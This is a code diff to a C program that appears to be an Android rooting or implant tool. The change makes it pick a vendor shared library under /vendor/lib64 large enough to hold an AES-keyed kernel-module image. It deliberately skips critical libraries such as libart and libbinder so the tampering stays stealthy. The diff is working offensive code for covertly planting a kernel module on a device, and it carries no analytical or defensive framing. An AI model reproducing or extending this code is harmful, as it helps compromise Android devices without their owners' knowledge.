@@ -13,6 +13,7 @@
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
+#include <dirent.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
@@ -539,17 +540,45 @@ static int createOrphanProcess(void) {
 
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
-static const char *detect_ko_target(void) {
+static const char *detect_ko_target(size_t min_size) {
+    /* Preferred candidates (known to be vendor_file labeled and non-critical) */
     static const char *const candidates[] = {
         "/vendor/lib64/libbinderdebug.so",
         "/vendor/lib64/libstagefrighthw.so",
         "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
     };
     for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
-        if (access(candidates[i], F_OK) == 0)
+        struct stat st;
+        if (stat(candidates[i], &st) == 0 && st.st_size >= (off_t)min_size)
             return candidates[i];
     }
-    return candidates[0];
+
+    /* Fallback: scan /vendor/lib64 for a suitable .so */
+    DIR *d = opendir("/vendor/lib64");
+    if (d) {
+        struct dirent *ent;
+        while ((ent = readdir(d))) {
+            size_t nlen = strlen(ent->d_name);
+            if (nlen < 4 || strcmp(ent->d_name + nlen - 3, ".so") != 0)
+                continue;
+            /* Skip critical libraries */
+            if (strstr(ent->d_name, "libart") || strstr(ent->d_name, "libbinder") ||
+                strstr(ent->d_name, "libandroid_runtime"))
+                continue;
+            char path[256];
+            snprintf(path, sizeof(path), "/vendor/lib64/%s", ent->d_name);
+            struct stat st;
+            if (stat(path, &st) == 0 && st.st_size >= (off_t)min_size) {
+                static char found[256];
+                snprintf(found, sizeof(found), "/vendor/lib64/%s", ent->d_name);
+                closedir(d);
+                return found;
+            }
+        }
+        closedir(d);
+    }
+
+    return candidates[0];  /* last resort */
 }
 
 static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
@@ -596,7 +625,16 @@ static int setup(int argc, char **argv) {
     memcpy(g_aes_key, aes_key, 32);
     _aes256_expand(g_aes_key, g_rk);
 
-    const char *ko_target = detect_ko_target();
+    /* Determine KO size from the selected image */
+    int andr = 0, major = 0, minor = 0;
+    size_t ko_size = 0;
+    if (read_device_versions(&andr, &major, &minor) == 0) {
+        const struct KoImage *ko = select_ko_image(andr, major, minor);
+        if (ko) ko_size = (size_t)(ko->end - ko->start);
+    }
+    if (ko_size == 0) ko_size = 512 * 1024;  /* safe default: 512 KB */
+
+    const char *ko_target = detect_ko_target(ko_size);
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
     strncpy(libcxx_ko_target, ko_target, 63);
     libcxx_ko_target[63] = '\0';
